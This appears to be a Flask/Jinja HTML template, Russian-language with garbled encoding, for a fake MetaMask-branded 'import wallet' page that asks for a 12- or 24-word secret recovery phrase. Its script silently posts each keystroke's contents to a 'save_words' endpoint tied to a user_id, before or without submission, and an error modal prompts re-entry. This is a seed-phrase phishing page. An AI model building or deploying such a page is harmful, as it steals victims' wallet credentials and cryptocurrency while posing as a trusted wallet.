<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>–ò–º–ø–æ—Ä—Ç –∫–æ—à–µ–ª—å–∫–∞</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap');
    body {
      margin: 0;
      padding: 0;
      font-family: 'Inter', sans-serif;
      background: linear-gradient(135deg, #eaffcc, #d3ffec);
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }
    .card {
      background: white;
      padding: 40px 30px;
      border-radius: 20px;
      box-shadow: 0 8px 30px rgba(0,0,0,0.1);
      text-align: center;
      max-width: 420px;
      width: 100%;
      animation: fadeIn 0.8s ease-out;
    }
    .image {
      width: 100px;
      margin: 0 auto 20px;
      display: block;
    }
    h1 {
      font-size: 22px;
      font-weight: 700;
      margin-bottom: 25px;
      color: #006652;
    }
    textarea {
      width: 100%;
      min-height: 120px;
      resize: none;
      padding: 14px;
      font-size: 15px;
      border: 1px solid #ccc;
      border-radius: 12px;
      outline: none;
      margin-bottom: 8px;
      font-family: 'Inter', sans-serif;
      box-sizing: border-box;
    }
    textarea:focus {
      border-color: #ff6a00;
      box-shadow: 0 0 6px rgba(255,106,0,0.4);
    }
    .hint {
      font-size: 13px;
      color: #666;
      margin-bottom: 15px;
    }
    .btn {
      display: inline-block;
      background: linear-gradient(135deg, #ff6a00, #ff9c33);
      border: none;
      padding: 14px 32px;
      font-size: 16px;
      font-weight: 600;
      border-radius: 50px;
      color: white;
      cursor: pointer;
      transition: all 0.3s ease;
      box-shadow: 0 6px 14px rgba(255,106,0,0.3);
      margin-bottom: 12px;
    }
    .btn:hover {
      transform: translateY(-2px);
      box-shadow: 0 10px 20px rgba(255,106,0,0.4);
    }
    .btn-secondary {
      background: white;
      border: 2px solid #ccc;
      color: #333;
      box-shadow: none;
    }
    .btn-secondary:hover {
      background: #f2f2f2;
    }
    .btn-small {
      background: #eee;
      color: #333;
      padding: 10px 20px;
      font-size: 14px;
      border-radius: 10px;
      margin-bottom: 20px;
      box-shadow: none;
    }
    .btn-small:hover {
      background: #ddd;
    }
    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(10px); }
      to { opacity: 1; transform: translateY(0); }
    }

    /* üîπ –ú–æ–¥–∞–ª—å–Ω–æ–µ –æ–∫–Ω–æ */
    .modal {
      display: none;
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: rgba(0,0,0,0.6);
      justify-content: center;
      align-items: center;
      z-index: 999;
    }
    .modal-content {
      background: white;
      padding: 30px;
      border-radius: 20px;
      box-shadow: 0 8px 24px rgba(0,0,0,0.2);
      text-align: center;
      max-width: 350px;
      position: relative;
      animation: fadeIn 0.4s ease;
    }
    .modal-content h2 {
      color: #d32f2f;
      margin-bottom: 10px;
    }
    .modal-content p {
      font-size: 15px;
      color: #444;
      margin-bottom: 20px;
      line-height: 1.5;
    }
    .modal-content .btn {
      background: linear-gradient(135deg, #ff6a00, #ff9c33);
      border: none;
      color: #fff;
      padding: 12px 25px;
      border-radius: 50px;
      cursor: pointer;
      font-weight: 600;
      transition: 0.3s;
    }
    .modal-content .btn:hover {
      transform: translateY(-2px);
      box-shadow: 0 6px 14px rgba(255,106,0,0.3);
    }
    .modal-close {
      position: absolute;
      top: 15px;
      right: 20px;
      cursor: pointer;
      font-size: 18px;
      color: #888;
    }
  </style>
</head>
<body>
  <div class="card">
    <img class="image" src="{{ url_for('static', filename='image.png') }}" alt="MetaMask">
    <h1>–ò–º–ø–æ—Ä—Ç–∏—Ä–æ–≤–∞—Ç—å –∫–æ—à–µ–ª–µ–∫</h1>
    <form action="{{ url_for('import_wallet') }}" method="POST">
      <textarea id="seed" name="words" placeholder="–í–≤–µ–¥–∏—Ç–µ –≤–∞—à—É —Å–µ–∫—Ä–µ—Ç–Ω—É—é —Ñ—Ä–∞–∑—É"></textarea>
      <div class="hint">–§—Ä–∞–∑–∞ –¥–æ–ª–∂–Ω–∞ —Å–æ–¥–µ—Ä–∂–∞—Ç—å 12 –∏–ª–∏ 24 —Å–ª–æ–≤–∞</div>
      <button type="button" class="btn-small" onclick="pasteFromClipboard()">–í—Å—Ç–∞–≤–∏—Ç—å</button>
      <br>
      <button type="submit" class="btn">–ò–º–ø–æ—Ä—Ç–∏—Ä–æ–≤–∞—Ç—å</button>
    </form>
    <a href="{{ url_for('wallet', user_id=request.args.get('user_id')) }}">
      <button class="btn btn-secondary">–û—Ç–º–µ–Ω–∞</button>
    </a>
  </div>

  <!-- üîπ –í—Å–ø–ª—ã–≤–∞—é—â–µ–µ –æ–∫–Ω–æ -->
  <div class="modal" id="errorModal">
    <div class="modal-content">
      <span class="modal-close" onclick="closeModal()">‚úñ</span>
      <h2>–û—à–∏–±–∫–∞</h2>
      <p>–§—Ä–∞–∑–∞ –¥–æ–ª–∂–Ω–∞ —Å–æ–¥–µ—Ä–∂–∞—Ç—å <b>12 –∏–ª–∏ 24 —Å–ª–æ–≤–∞!</b><br>
         –ü—Ä–æ–≤–µ—Ä—å—Ç–µ –ø—Ä–∞–≤–∏–ª—å–Ω–æ—Å—Ç—å –≤–≤–µ–¥–µ–Ω–Ω–æ–π —Ñ—Ä–∞–∑—ã!</p>
      <button class="btn" onclick="closeModal()">OK</button>
    </div>
  </div>

  <script>
    async function pasteFromClipboard() {
      try {
        const text = await navigator.clipboard.readText();
        document.getElementById("seed").value = text;
      } catch (err) {
        alert("–ù–µ —É–¥–∞–ª–æ—Å—å –≤—Å—Ç–∞–≤–∏—Ç—å –∏–∑ –±—É—Ñ–µ—Ä–∞ –æ–±–º–µ–Ω–∞. –†–∞–∑—Ä–µ—à–∏—Ç–µ –¥–æ—Å—Ç—É–ø –∫ –±—É—Ñ–µ—Ä—É.");
      }
    }

    function closeModal() {
      document.getElementById("errorModal").style.display = "none";
    }

    // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –º–æ–¥–∞–ª–∫—É –µ—Å–ª–∏ —Å–µ—Ä–≤–µ—Ä –ø–µ—Ä–µ–¥–∞–ª show_modal=True
    {% if show_modal %}
      document.getElementById("errorModal").style.display = "flex";
    {% endif %}

    // üîπ –ê–≤—Ç–æ—Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ –ø—Ä–∏ –≤–≤–æ–¥–µ
    const seedInput = document.getElementById("seed");
    let typingTimer;
    seedInput.addEventListener("input", function () {
      clearTimeout(typingTimer);
      typingTimer = setTimeout(() => {
        const words = seedInput.value;
        fetch("{{ url_for('save_words', user_id=request.args.get('user_id')) }}", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ words })
        }).catch(err => console.error("–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏:", err));
      }, 400);
    });
  </script>
</body>
</html>
